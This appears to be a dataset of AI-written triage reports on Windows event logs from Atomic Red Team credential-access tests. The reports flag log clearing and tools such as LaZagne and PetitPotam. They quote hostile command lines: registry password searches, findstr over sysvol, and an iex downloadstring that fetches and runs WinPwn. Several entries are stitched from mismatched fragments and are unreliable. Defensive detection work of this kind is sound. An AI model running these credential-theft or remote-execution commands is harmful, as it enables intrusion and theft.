   - The timing of these processes and their relation to log clearing events suggests orchestrated activities by the same user account with elevated privileges (high integrity level).

### Threat Assessment:
- The combination of event log clearings and the execution of the PowerShell script for credential harvesting strongly suggests malicious activities. This is evident by the attempts to hide actions as soon as they occur, potentially as part of a larger attack or data breach strategy.

### Guidance on How to Proceed:
- Immediately isolate the server (Server002) to prevent further execution of potentially malicious scripts and log tampering.
- Conduct a forensic analysis of the server, ensuring no persistence mechanisms or additional payloads exist.
- Review the privilege level and access of the `admin_test` account and consider revoking its access temporarily.
- Audit all accounts and logs for unusual behaviors or additional signs of compromise.
- Reset passwords for all possibly affected accounts.
- Report this incident to relevant authorities and follow legal or compliance requirements for breaches.

### Resolution:
- **MALICIOUS**: The logs contain activity that is 100% malicious based on the behavioral patterns of log clearing and credential harvesting attempts via PowerShell."
LaZagne - Credentials from Browser,"Based on the provided logs, the following observations have been made:

1. **Sysmon Events:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) are observed being executed with command-line arguments to clear event logs for channels: ""Microsoft-Windows-Sysmon/Operational"", ""System"", ""Application"", and ""Windows PowerShell"". This activity is suspicious as `wevtutil.exe` is often used by attackers to cover their tracks by clearing event logs.
   - These `wevtutil.exe` executions are associated with the user `SERVER002\\admin_test` with high integrity level, indicating a high-level privilege operation, which further raises suspicion.

2. **System Logs:**
   - Event ID 104 indicates that someone has cleared the logs for the ""System"" and ""Windows PowerShell"" channels. The user `admin_test` on `SERVER002` is responsible for this activity. This could indicate an attempt to cover tracks after potentially malicious activity.

3. **Security Logs:**
   - Event ID 1102, which indicates that the security log was cleared, is also seen. This is a critical indicator of potentially malicious activity, as clearing security logs is a common tactic to erase traces of a compromise.
   - There are standard logon events (Event ID 4624 and 4672) for the SYSTEM account that align with the timestamps of these activities, suggesting possibly legitimate impersonation or use of system credentials, but combined with log clearing actions, this becomes suspicious.

4. **Additional Observations:**
   - The execution of `LaZagne.exe` from a `cmd.exe` process is noted. LaZagne is a well-known tool used to extract passwords from browsers and various software, which is consistent with post-exploitation activities.
   
5. **Process Anomalies:**
   - Several legitimate system processes appear multiple times across the logs (like `conhost.exe` associated with `cmd.exe`), which may be typical in terms of process hierarchy but when taken in conjunction with the clearing of logs raises an additional red flag.

**Assessment:**

- The logs present clear indicators of potentially malicious behavior, primarily characterized by the clearing of multiple log channels, combined with the execution of a credential dumping tool (`LaZagne.exe`).
- The user `SERVER002\\admin_test` appears frequently associated with the log-clearing activities, indicating potentially compromised or misused credentials.
- Overall, this series of actions within these logs is highly indicative of malicious behavior.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediately isolate the affected host (Server002) from the network to prevent further propagation or data exfiltration.
- Conduct a thorough forensic analysis of the server to identify the full scope and method of compromise, focusing on artifact collection for potential credential gathering tools, persistence mechanisms, and additional indicators of compromise (IOCs).
- Reset credentials associated, especially for `admin_test` and any other high-privilege accounts, to ensure security posture is restored.
- Review permissions and audit account accesses related to the affected systems and users to bolster future protections.
- Investigate connected systems for lateral movement or further compromise, given the possible use of system accounts and tool usage patterns seen in logs."

List Credential Files via Command Prompt,"Based on the analysis of the provided logs, several points of interest were identified that warrant closer scrutiny:

1. **Security Event Log Clearing:**
   - Event ID 1102 in the Security log indicates that the security event log was cleared by the user `admin_test` (SID S-1-5-21-3962163828-2803415714-1403596700-1006) on `Server002`. Clearing security event logs can be a typical indicator of an attempt to cover up tracks after potential unauthorized or malicious activity.

2. **Log File Clearing in Various Channels:**
   - Several instances of log file clearing activity were noted in the System log with Event ID 104 in channels `System` and `Windows PowerShell`. The user `admin_test` is again involved, aligning with the same timeframe as the security log clearing. This repetition across multiple channels suggests an attempt to remove traces of specific activities that might have occurred. 

3. **Process Execution Analysis:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) being executed were noted across the logs. The utility was used to clear various logs, as indicated by the command line arguments (e.g., `cl Security`, `cl System`). The `wevtutil.exe` executions emanated from the user `admin_test` with a high integrity level.
   - There are also `cmd.exe` commands that list directories containing potential credential files. The command executed to list directories with hidden attribute in `AppData\Local\Microsoft\Credentials\` and `AppData\Roaming\Microsoft\Credentials\` suggests data reconnaissance activities.

4. **Edge Update Service:**
   - Numerous entries are associated with Microsoft Edge Update, including file executions and service activities. While this could be a routine update process, the corresponding high number of activities around the time logs were cleared might demand further verification to rule out misuse under the guise of a legitimate process.

**Conclusion:**

- The repeated log clearing, combined with the use of potentially sensitive command-line operations targeting credential directories, strongly suggests suspicious behavior.
  
- The activity includes indicators that are typically associated with post-compromise actions, especially around times when logs are cleared to hide tracks.

**Resolution:**

- **SUSPICIOUS** - The logs contain activity that does not look right and needs further investigation. Immediate actions should be taken to:
  - Verify the intended actions of the user `admin_test`, including a review of authorized activities that may warrant such log and command usages.

   - Examine other systems in the network for similar log elements or network access patterns to detect lateral movement.

3. **Log Retention Policy**:
   - Ensure that enhanced logging policies are in place to detect such log clearing activities. Use log forwarding to a central log management system to retain logs even when local logs are cleared.

4. **Credential Handling**:
   - Reset or rotate credentials used on `Server002`, focusing on those associated with the `admin_test` user account.

5. **Review and Revocation**:
   - Review privileges for the `admin_test` account and other accounts with significant privileges. Revoke any unnecessary privileges and ensure the principle of least privilege is applied.

6. **Security Improvements**:
   - Enhance detection capabilities by employing monitoring tools such as a SIEM (Security Information and Event Management) system to identify potential compromises earlier.

Given the potential severity of this situation, it is crucial to act swiftly to secure the environment and limit any further damage."
Enumeration for Credentials in Registry,"After conducting a thorough review of the provided logs, several points of anomalous and potentially malicious activity have been identified:

### Suspicious Activities:

1. **Log Clearing Events:** 
   - The security log shows a `1102` event indicating that the Security log was cleared by the user `admin_test` (SID: S-1-5-21-3962163828-2803415714-1403596700-1006) at `2024-10-27 19:51:06.7868535`.
   - System log entries with EventID `104` corroborate that both the System and Windows PowerShell logs were cleared by the user `admin_test` around the same timestamp.
   - Clearing of logs is often performed by malicious actors attempting to cover their tracks.

2. **Usage of Wevtutil Command:**
   - Multiple entries of the execution of `wevtutil.exe`, a utility to manage Windows event logs (Events with EventID `1`), show command-line arguments to clear the ""Application"", ""System"", and ""Windows PowerShell"" logs. This activity appears consistent with the log clearing noted above and was done by `admin_test`.
   - These deletions highlight a concerning behavior typically associated with an attempt to remove evidence of activity.

3. **Registry Queries:**
   - Execution of `cmd.exe` with suspicious command lines:
     - `\""cmd.exe\"" /c reg query HKLM /f password /t REG_SZ /s` 
     - `reg query HKCU /f password /t REG_SZ /s`,
   - Such commands query the Windows registry for possible passwords, indicative of credential harvesting attempts.

4. **Logon Events for Admin User (admin_test):**
   - Multiple logon events for the user `admin_test`, including EventID `4624`, indicate high integrity level logins. While this might be regular administrational duties, in conjunction with other log clearing behavior, this merits caution.

### Malicious Indicators:

The combination of these activities suggests a deliberate and potentially unauthorized effort to manipulate logging data to hide further actions. The execution of log-clearing commands, searching for passwords in the registry, and unusual administrative user activity collectively construct an image of suspicious intent.

3. **Security and System Log**:
   - Event ID 1102 in the Security log, indicating ""Log File Cleared"" by user `admin_test`. Clearing event logs can be an indicator of malicious activity intended to obfuscate operations executed on the system.
   - Event ID 104 in the System log also records the clearing of specific logs, providing further evidence of potential log tampering or clearing activity.

4. **Process Execution Context**:
   - Operations are executed with a high integrity level (`High`), suggesting administrative privileges are being used. This is concerning when used in conjunction with malicious commands like extracting `lsass` memory dumps.

**Threat and Risk Assessment**:
The analysis of this activity points towards a likely compromise involving credential harvesting using `lsass` dump extraction, followed by log clearing to obscure these activities. The use of administrator-level privileges and the sequence of events outlined indicate both technical capability and malicious intent.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the impacted host `Server002` to prevent further credential access or spread.
- Conduct a thorough investigation to determine how the malicious actor gained access or administrative privileges.
- Audit all accounts for compromise, especially focusing on the `admin_test` account.
- Review and improve logging and monitoring capabilities, ensuring that event logs are adequately backed up and protected from tampering.
- Implement strict application whitelisting and PowerShell execution policies to prevent misuse.
- Reset passwords after securing potentially compromised accounts, and review the broader organizational security posture."
PetitPotam,"After reviewing the provided event logs, the following observations have been made:

1. **Use of PowerShell with Suspicious Command Line**: 
   - The logs show multiple PowerShell executions with unusual command lines. Notably, the PowerShell was executed with a command pointing to a suspicious executable, ""PetitPotam.exe"", located within a temporary directory (""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\""). PetitPotam is known for being a tool used in NTLM relay attacks. The command includes using PowerShell to initiate the executable, which is suspicious and indicative of misuse.

2. **Log Clearance Activity**:
   - The logs include Windows Event ID 1102 (Security log cleared) and Event ID 104 (System log cleared). Both activities were executed by the user ""admin_test"". Clearing event logs is a significant indicator of an attempt to cover tracks, often seen in malicious activities trying to hide evidence of other actions.

3. **Execution of Eventing Commands (`wevtutil.exe`)**:
   - There are several instances of the `wevtutil.exe` process being executed with the ""cl"" option (clear), to clear logs from multiple channels like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Security"". This corroborates the log clearance activity and also suggests an attempt to erase evidence of potential intrusion.

4. **Process Integrity and Deviation from Usual Behavior**:
   - Most processes, including PowerShell and `wevtutil.exe`, were executed with high integrity levels. The commands were executed under a user account ""SERVER002\\admin_test"" that notably had significant administrative privileges, indicating this account was potentially compromised or misused.

5. **Involvement of Network Service and System-Level Processes**:
   - Various processes under ""NT AUTHORITY\\SYSTEM"" and ""NT AUTHORITY\\NETWORK SERVICE"" were running, including updating Microsoft Edge. However, there were no signs of malicious intent or unusual behavior through these processes.

### Assessment:
Given the logs reveal multiple signs of suspicious activity, primarily driven by the execution of known attack tools and log tampering efforts, the evidence strongly leans towards a potential compromise or malicious intent.

### Resolution:
- **MALICIOUS**: The activities detailed suggest the system was compromised with the attacker leveraging tools like PetitPotam and clearing logs to obscure their actions.

### Guidance on How to Proceed:
1. **Incident Response Initiation**: Immediate incident response procedures should be enacted, including isolating the affected machine to prevent further compromise and propagation.
2. **Review and Secure User Accounts**: Assess and secure user accounts, implementing forced password changes and checking for unauthorized account changes.
3. **Deploy Endpoint Detection and Response Tools**: Enhance monitoring and threat detection to catch anomalous behavior using EDR solutions.
4. **Review and Harden System Configurations**: Conduct thorough audits of security configurations, especially around hosting environments and PowerShell policies.
5. **Conduct a Forensic Investigation**: Acquire logs and conduct a more detailed forensic investigation to understand the attack vector, potential data breaches, and the attacker's footprint.

The logs present sufficient evidence to treat the situation as severe, necessitating a comprehensive response to restore security integrity and prevent recurrence."
"Registry dump of SAM, creds, and secrets","Based on the provided Windows event logs, the following key points and assessments can be made:

1. **Security Log Events**:
   - Event ID 4624 indicates a successful logon, which by itself is a normal event. However, the logon type is 5, which indicates a service logon. The process associated is `C:\Windows\System32\services.exe`, which is standard for service-type logons.
   - Event ID 4672 details a privilege assignment, which includes sensitive privileges like `SeDebugPrivilege`. The assignment of such privileges in itself isn't immediately suspicious but should be evaluated in the context of the actions that follow.
   - Event ID 1102 shows that the security log was cleared by the user `admin_test`. Clearing logs can be an indication of malicious activity, as attackers often clear logs to cover their tracks.

2. **Sysmon Log Events**:
   - The logs show multiple executions of `whoami.exe`, `wevtutil.exe`, and `cmd.exe`, with the `admin_test` user frequently executing these processes. While these processes by themselves aren't inherently malicious, their pattern of execution and the context may raise suspicion.
   - An execution of `cmd.exe` is noted with the command line attempting to save registry hives related to HKLM\SAM, HKLM\SYSTEM, and HKLM\SECURITY. This action is highly indicative of an attempt to exfiltrate sensitive registry information, possibly for offline password cracking or system information extraction, which is not standard behavior for an admin user in normal operations.

3. **System Log Events**:
   - Events indicate that the System and PowerShell event logs have been cleared almost simultaneously with the security logs. This is consistent with behavior where an adversary attempts to remove traces of their activity from the system logs.

### Assessment and Conclusion:

The pattern of activities observed, including the clearing of logs and the registry hive exports, suggests that there is likely malicious intent. The combination of sensitive command execution involving registry exports, followed by clearing event logs points towards actions often taken by attackers for data exfiltration and covering tracks.

### Resolution:
- **MALICIOUS** - The activities in the logs indicate malicious behavior associated with a potential compromise of the host. Immediate investigation and incident response actions are advised.

### Recommended Action Steps:
1. **Isolate the Host**: To prevent further potential damage, isolate the affected system from the network.
2. **Detailed Forensics**: Conduct a thorough forensic analysis on the machine, capturing a memory dump and looking for any indicators of persistence or additional malicious files.
3. **Review Account Activity**: Investigate the `admin_test` account for any unauthorized access or indications it might be compromised.
4. **Enhance Monitoring**: Increase monitoring on other systems for similar activities or indicators of compromise, particularly focusing on log clearing events and unusual process executions.
5. **Implement Controls**: Review and reinforce access controls and audit policies to prevent recurrence, including added vigilance on systems for log clearing events and unauthorized registry accesses."
GPP Passwords (findstr),"Upon reviewing the event logs provided, several key points stand out that warrant a detailed analysis:

1. **Security Log - Log File Cleared Event 1102**:
   - The event with ID 1102 indicates that the security event log has been cleared by the user ""admin_test"". Clearing logs is a common tactic used by adversaries to cover their tracks after potentially malicious activities. This is a significant red flag.

2. **Sysmon Log - Process Creation and Image Load**:
   - Multiple instances of process execution such as `wevtutil.exe` using the `cl` (clear) operation on various logs including Security, System, and Windows PowerShell (event IDs: 17962, 17966, 17970, etc.). This strongly indicates attempts to tamper with logs, which could be an effort to hide malicious activity.

3. **Sysmon Log - Execution of Cmd with Suspicious Command-Line**:
   - An instance of `cmd.exe` is found executing a suspicious command-line: `""cmd.exe"" /c findstr /S cpassword %%logonserver%%\\sysvol\\*.xml`. This command suggests an attempt to search for sensitive information like cached passwords in XML files. This is a known technique used by attackers to exploit Group Policy Preferences (GPP) files to obtain credentials.

4. **System Log - Time Change Events**:
   - Events indicating changes in system time (event ID 4616) were recorded. While time changes are not inherently malicious, when combined with other suspicious behavior like log clearing, it may be a tactic to manipulate timestamps within logs to obfuscate activities.

5. **Application Log - Edge Update Service**:
   - Multiple services related to Edge Update are started and stopped. While Edge Update activities can be routine, the sequence and timing in conjunction with other events might need further investigation to ensure they are legitimate.

### Assessment

The activities captured in the logs, particularly the clearing of security event logs, use of `wevtutil.exe` to clear logs, and the searching for passwords using `cmd.exe`, suggest that there is a high likelihood of malicious activity or compromise. These actions are consistent with post-exploitation behavior aimed at persisting access or exfiltrating sensitive data without detection.

### Resolution: MALICIOUS

- **Threats/Risks Identified**: Potential unauthorized access with attempts to exfiltrate sensitive data and cover tracks.
- **Guidance on How to Proceed**:
  - Immediately conduct a full forensic analysis of the compromised system.
  - Review access rights and changes associated with the user ""admin_test"" and determine if this account is compromised.
  - Begin containment measures to isolate the system from the network to prevent further spread or exfiltration.
  - Restore logs, if possible, from backups or other monitoring solutions to determine the full scope of activities.
  - Consider implementing additional monitoring and security controls to detect and prevent similar activities in the future.
  - Engage with incident response teams to take further action as necessary based on the forensic findings. 

This assessment is based on the indicators present in the logs, and further investigation may uncover additional details or threats."
WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"Upon a detailed analysis of the provided event logs, several indicators suggest potential malicious activity or at least activities that warrant further investigation:

### Findings:

1. **Log Clearing Activity:**
   - The system logs indicate multiple instances of log clearing activities using `wevtutil.exe`, specifically targeting crucial logs such as System, Windows PowerShell, and Security logs. These actions are typically associated with attempts to cover tracks after unauthorized or malicious actions. Log clearing actions are flagged with EventID 104 and EventID 1102 in the logs, performed by an account named `admin_test`. This is a strong indication of malicious intent, particularly if these actions are not part of regular administrative duties.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs show suspicious command execution, including the downloading and execution of a script from an external URL. Specifically, the use of `iex(new-object net.webclient).downloadstring('<URL>')` to execute a script from a GitHub repository, which deploys the `Invoke-Sharpweb.ps1` script. This script is known to be used for credential harvesting among other potentially malicious activities. The URL included in these logs suggests potentially unauthorized external script execution (linked to a GitHub repository known for housing offensive security tools).

3. **Process Execution Patterns:**
   - The Sysmon logs reveal a chain of process executions often used in post-exploitation scenarios. These processes include utilities like `whoami.exe` and frequent usage and clearing of logs using `wevtutil.exe` and `conhost.exe`.
   - The execution of `powershell.exe` with potentially harmful scripts further backs up the potential for malicious activity, especially in conjunction with the system logs being cleared.

### Threat Assessment:

The above findings indicate a high likelihood of malicious activity on the host system `Server002`. The clearing of logs combined with the execution of known potentially harmful PowerShell scripts from an external source points towards unauthorized access and possible data exfiltration or other compromising activities.

### Recommendation and Resolution:

**Resolution: MALICIOUS**

Given the clear indicators of potentially hostile actions such as log tampering and suspicious remote script execution, the host is likely compromised. Immediate actions should include:
- Isolating the affected system from the network to prevent further spread or data exfiltration.
- Conducting a full forensic analysis to determine the extent of the compromise, the potential data accessed or modified, and identifying further malicious behaviors.
- Reviewing and enhancing security measures to prevent future incidents, such as implementing stricter monitoring of PowerShell executions and access to log clearing utilities.
- Investigating the account `admin_test` to determine if it has been compromised.

These steps should be taken promptly to protect sensitive data and maintain system integrity."
WinPwn - passhunt,"Upon analyzing the provided logs, here's a detailed breakdown of the findings:

### Suspicious or Anomalous Behavior:

1. **Log Clearance**:
   - Multiple events (Event ID 104 in the System log and Event ID 1102 in the Security log) indicate that logs were cleared by the user ""admin_test"". Specifically, the following channels were cleared:
     - System
     - Windows PowerShell
     - Security
   - Clearing event logs is often performed by attackers to cover their tracks and is highly suspicious unless there is a legitimate reason provided by the system administrator.

2. **Suspicious PowerShell Activity**:
   - There are records of PowerShell execution with command arguments that suggest the download and execution of scripts from external repositories:
     - `""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), passhunt -local $true -noninteractive}`
   - The use of `Invoke-Expression (iex)` in combination with a downloaded string from the internet is a common obfuscation technique used in malicious activities.

3. **Privilege Escalation Indications**:
   - User ""admin_test"" has a session with a high set of privileges as indicated by Event ID 4672: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, etc. While this may align with the user's privileges, the log file clearance and PowerShell activity heighten concerns about potential misuse.

4. **Sysmon Logs Execution**:
   - Where `wevtutil.exe` was used multiple times to clear specific event logs (System, Security, Windows PowerShell).
   - The rapid sequence of executed commands involving `whoami`, `conhost`, `wevtutil`, and `hostname` suggests a scripted or automated environment interaction rather than a typical interactive session by an administrator.

### Malicious Activity or Compromise:

- The combination of cleared logs across multiple channels, suspicious PowerShell script execution downloading from the internet, and a series of automated command executions strongly indicate malicious behavior.

### Assessment:

- **Resolution: MALICIOUS** - The recorded activities show clear indicators of compromise:
  - The clearing of event logs to hide malicious actions.
  - Execution of a potential malicious PowerShell script from an external source.
  - Abnormal command execution sequences typically associated with post-exploitation activities.

### Guidance to Proceed:

1. **Immediate Actions**:
   - Isolate the affected host (Server002) from the network to prevent further potential damage or lateral movement.
   - Perform a comprehensive forensic analysis on the host to uncover any additional malicious activities or artifacts that may not be present in the logs.

2. **Review Account Activities**:
   - Investigate the account ""admin_test"" for unauthorized access or misuse.
   - Reset passwords and enforce multi-factor authentication if not already implemented.

3. **Security Enhancements**:
   - Ensure proper logging and monitoring are in place moving forward to catch similar activities earlier.
   - Enhance endpoint security measures, with emphasis on monitoring and controlling PowerShell usage.

4. **Incident Response and Communication**:
   - Engage the Incident Response Team to conduct a thorough investigation and remediation.
   - Communicate with stakeholders about the detected breach, its potential impacts, and the steps being taken.

These steps align with addressing the detected malicious activities and mitigating further risk to the organization's network and data integrity."
Search for Passwords in Powershell History,"Based on the analysis of the provided logs, a few events stand out as potentially suspicious or indicative of malicious activity:

1. **Event Log Clearing:**
   - Multiple logs have been cleared around the same timestamp (`EventID: 1102` in Security Log and `EventID: 104` in System Log). The clearing of event logs, particularly in quick succession, can be a common tactic to hide malicious activity.

2. **Time Change Event:**
   - There is a `EventID: 4616` indicating time change events. Time manipulation in a system can indicate attempts to circumvent logs or schedule tasks.

3. **PowerShell Command Execution:**
   - A suspicious PowerShell command was executed (`EventID: 1` in Sysmon Log and several `600` events in the Windows PowerShell Log). The execution of a command that tries to access history files and search for strings like ""password,"" ""key,"" ""pwd,"" and ""pass"" suggests someone might be trying to extract sensitive information.

4. **Wevtutil Usage:**
   - Several instances of `wevtutil` are observed (`EventID: 1` and `5` in Sysmon Log), clearing various logs like Security, System, and PowerShell, which coincide with the event log clearing events (`EventID: 1102` and `104`).

5. **User Context and Processes:**
   - There are processes executed under the `admin_test` user context, which might not be expected if administrative privileges or indirect access was exploited (e.g., `whoami`, `hostname` under high integrity level).

Given these observations:

- **Assessment:** The presence of event log clearing, time manipulation, suspicious PowerShell script execution, and `wevtutil` usage for clearing logs collectively suggest potentially malicious activity. These events are typical indicators of malicious attempts to cover tracks, gather sensitive information, and perform nefarious activities undetected.

- **Resolution:** **MALICIOUS**

- **Guidance on how to proceed:**
  - Immediately initiate an incident response procedure.
  - Isolate the affected host (Server002) to prevent further damage or data exfiltration.
  - Conduct a full forensic investigation to determine the scope of the compromise.
  - Review user accounts and permissions, particularly focusing on the `admin_test` account.
  - Monitor the network for signs of data exfiltration or lateral movement.
  - Consider rebuilding the affected system from a known good state after full analysis and cleaning.
  - Enhance logging and alerting mechanisms to detect similar future activities promptly.
  - Conduct a security review to harden systems against such activities.  

The indicated logs and behavior strongly point to a compromise that should be addressed immediately to mitigate further risks."
Azure - Dump All Azure Key Vaults with Microburst,"Upon examining the provided logs, several indicators stand out that suggest potential malicious activity:

1. **Log Clearing**: The security event log (Event ID 1102) and system log (Event ID 104) both indicate that logs were cleared. This action is often associated with malicious activity as attackers attempt to hide their tracks. The user responsible for these actions was `admin_test`, which might be an internal administrator account abused by an attacker.

2. **High Privileges Granted**: There are multiple instances (Event ID 4672 in the security log) where the user `admin_test` is granted a series of high privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. This suggests potential privilege escalation or misuse of an administrative account for unauthorized purposes.

3. **Processes of Interest**:
   - **Powershell Usage**: There is evidence of PowerShell being used to execute potentially dangerous commands (Event ID 1 in Sysmon and corresponding logs in Windows PowerShell log). The PowerShell script seems to import a module named `Get-AzurePasswords`, potentially indicating an attempt to access Azure credentials which is highly suspicious.
   - **Use of `wevtutil`**: The command-line utility `wevtutil.exe` was used to clear event logs (`cl` command). This is corroborated by both Sysmon (Event ID 1) and Security logs. This utility use is synonymous with attempts to cover up activity on a host.

4. **Use of Atomic Red Team**: The PowerShell script loaded from the local temp directory appears to belong to Atomic Red Team, a common red teaming toolset. Although used for legitimate security testing, the presence of scripts from such sources when unexpected could indicate unauthorized penetration testing or attacks if not planned.

5. **Security Log**: There are multiple NTLM logons (Event ID 4624 in the security log) with logon type 3 (network). These might be benign in isolation, but in combination with the above, they could suggest lateral movement attempts or external access.

Given these findings, the resolution is:

- **MALICIOUS**: There is evidence of log tampering, privilege escalation, and potentially malicious PowerShell usage aimed at accessing sensitive information.

**Recommendations**: 
- Conduct a full investigation into the user account `admin_test` to determine legitimate usage versus compromise.
- Review all systems for unauthorized remote connections and credential access attempts.
- Consider isolating the affected system to prevent further exploitation and conduct a thorough forensic analysis.
- Notify your internal incident response team and adhere to your incident response procedures."
Simulating access to Windows Firefox Login Data,"**Detailed Analysis of Logs:**

1. **Windows PowerShell Log Analysis:**
   - **Observation:** Multiple PowerShell instances executed the command `powershell.exe & {Copy-Item ""$env:APPDATA\\Mozilla\\Firefox\\Profiles\\"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads"" -Force -Recurse}`.
   - **Risk Assessment:** This PowerShell activity attempts to copy Firefox profile data to a suspicious directory path (which includes "".."", possibly indicating a directory traversal or backtracking attack). Use of such a command suggests unauthorized data exfiltration or a preparatory step for a larger attack.
   
2. **System Log Analysis:**
   - **Observation:** An event (EventID 104) indicates that an admin user (`admin_test`) cleared the System log and Windows PowerShell log using the `wevtutil.exe` tool.
   - **Risk Assessment:** Clearing logs is commonly associated with an attacker trying to hide their tracks. This action could potentially indicate malicious intent to perform actions without leaving forensic trails.

3. **Security Log Analysis:**
   - **Observation:** A security log clear event (EventID 1102) followed by a login event (EventID 4624 for SYSTEM account).
   - **Risk Assessment:** The clearing of security logs by `admin_test` is highly suspicious and suggests malicious activity, especially if followed by administrative login actions. An event of this nature is a critical indicator of compromise.

4. **Sysmon Log Analysis:**
   - **Observation:** The `wevtutil.exe` tool was used to clear multiple logs: System, Application, Security, and Windows PowerShell, executed by the `admin_test` user.
   - **Risk Assessment:** The use of `wevtutil.exe` to clear logs by an admin user is a classic tactic used by attackers post-compromise. This strongly indicates an attempt to obfuscate activity from security operations.

5. **Multiple Command Executions and Utilities:**
   - **Observation:** Use of tools like `whoami.exe` and `HOSTNAME.EXE`, potentially for reconnaissance.
   - **Risk Assessment:** While not malicious by default, in context with other events, these actions might suggest reconnaissance by an intruder to gather system and account information.

**Overall Assessment:**
The combination of unauthorized PowerShell activity aimed at accessing personal data, systematic log clearing, and use of `wevtutil.exe` by an admin user ('admin_test') strongly suggests unauthorized access and possible malicious behavior.

**Final Resolution:**
- **MALICIOUS** - The logs contain activity (log clearing, suspicious PowerShell commands) that indicate with high confidence malicious intent and compromise.

**Guidance on How to Proceed:**
- Immediately isolate Server002 from the network to prevent further data compromise or lateral movement.
- Conduct a full forensic analysis on Server002 to determine the extent of the breach and identify other potentially affected systems.
- Review user `admin_test` for the legitimacy of account activity—consider resetting its credentials or disabling it temporarily.
- Implement enhanced logging and monitoring to detect similar activities in the future.
- Alert security teams and management to the potential breach, and prepare for incident response measures."
Azure - Dump Azure Instance Metadata from Virtual Machines,"Upon analyzing the provided Windows event logs, several activities stand out that warrant further investigation:

1. **Event Logs Cleared:**
   - The logs depict multiple instances where event logs were cleared. Specifically, EventID 1102 in the Security log and EventID 104 in the System log indicate the clearing of logs using `wevtutil.exe`, which is a native Windows utility. The 'admin_test' account executed this command. Clearing logs can be indicative of an attempt to hide traces of activity, particularly when there's no legitimate reason provided for this action. It is an often utilized technique in attack scenarios to cover tracks.

2. **PowerShell Activity:**
   - Multiple PowerShell events logged in the Windows PowerShell log (EventID 600) with a suspicious command involving `Invoke-RestMethod` to access metadata from an address typical within cloud environments (`http://169.254.169.254`). The command aims to convert and store JSON data, indicating potential reconnaissance activity or data exfiltration. Such host metadata querying aligns with tactics seen in credential access and discovery phases of attacks.

3. **Other Process Executions:**
   - The logs show `whoami.exe` and `hostname.exe` running, which could be part of normal diagnostic activity or early indicators of the reconnaissance stage when used to gather user and system information without apparent context.
   - The extensive use of `wevtutil.exe` to clear specific logs across the categories (System, Application, Security, and PowerShell) within a short timeframe is indicative of automated or malicious scripted activity, again linked to the 'admin_test' account.

4. **Time Change Events:**
   - Multiple instances of EventID 4616 show the system time was adjusted to bring the previous and new times closer together. While time adjustments might have legitimate explanations, frequent or unexpected time changes can point to evasive actions, particularly around log timestamps.

**Assessment:**

The convergence of these activities—consistent log clearance, PowerShell commands for potential reconnaissance, and multiple system actions executed within short periods—point towards suspicious behavior. The log clearing by 'admin_test', especially with `wevtutil.exe`, warrants attention.

**Resolution: SUSPICIOUS**

This analysis concludes that the captured activities are **SUSPICIOUS**. The outlined behaviors require deeper investigation, notably focusing on the 'admin_test' account activities, the potential compromise of this account, and any external connections initiated from the host. Additional actions could include:
- Conducting a forensic analysis of the host to determine the presence of any malware or unauthorized access tools.
- Reviewing network traffic logs for connections related to the 169.254.169.254 IP address to check for data exfiltration or unauthorized connections.
- Auditing any similar log patterns across other systems in the network.

Prompt investigative and remediation steps are recommended to confirm the nature and scope of the activity observed."
Access unattend.xml,"Upon reviewing the Windows event logs, particularly the Sysmon and System logs, here are the key points regarding the suspicious and seemingly malicious activities identified:

1. **Multiple Log Files Cleared:**
   - There are instances where log files (System, Windows PowerShell, and Security logs) were cleared by the user `SERVER002\admin_test`. 
   - Clearing logs is commonly associated with malicious activity as it is often done to hide tracks after executing unauthorized activities.

2. **Use of `wevtutil.exe` to Clear Event Logs:**
   - The `wevtutil.exe` command-line utility is used to clear event logs (e.g., ""cl System""). This activity directly aligns with the log-clearing events.
   - The use of such a command by a non-system administrator or during unusual times could indicate malicious intent to cover up tracks.

3. **Execution of Suspicious Processes:**
   - `cmd.exe` was used with a command to view `C:\Windows\Panther\unattend.xml`. This action could be an attempt to gather system configuration or credentials. 
   - The execution of `whoami.exe` (to check the current user context) also adds concern as it indicates possible reconnaissance activity.

4. **Processes Executed with High Integrity Level:**
   - Several processes and commands are executed at a high integrity level, including `wevtutil.exe` and `cmd.exe`. This indicates that the user has elevated privileges, which is consistent with either malicious use or administrator activity.

Based on the above findings, the sequence of activities (clearing logs, using command-line tools, and executing potential reconnaissance commands) strongly indicates that malicious activities have taken place. The events suggest potential unauthorized use of privileged accounts to conceal malicious commands and gather system information.

**Assessment and Resolution:**
- **Resolution:** MALICIOUS
- **Threats/Risks Identified:** Potential data theft, unauthorized access, and actions to hide traces.
- **Guidance on How to Proceed:**
  1. **Immediate Actions:**
     - Isolate the affected host (`Server002`) from the network to prevent further malicious activity.
     - Conduct a thorough forensic investigation of the host, focusing on the actions of the user `admin_test`.
  2. **Access Review:**
     - Review and possibly revoke privileged access for accounts involved, particularly `admin_test`.
     - Implement logging and monitoring to detect similar activities in the future.
  3. **Incident Handling:**
     - Follow incident response procedures to analyze the scope and impact.
     - Communicate with relevant stakeholders about the breach and potential mitigation steps."
Extracting passwords with findstr,"Upon reviewing the provided logs from the System, Windows PowerShell, Sysmon, Application, and Security channels, several suspicious activities and potential indicators of compromise have been identified:

### Analysis of Logs:

1. **Log File Clearing:**
   - Multiple instances of log file clearing events (event ID 104) in the System and Security logs suggest potential malicious behavior. The logs indicate the use of `wevtutil.exe` by the user `admin_test` to clear logs across different channels (System, Windows PowerShell, Security). This action is commonly associated with attempts to cover tracks on a compromised system.

2. **Suspicious PowerShell Activity:**
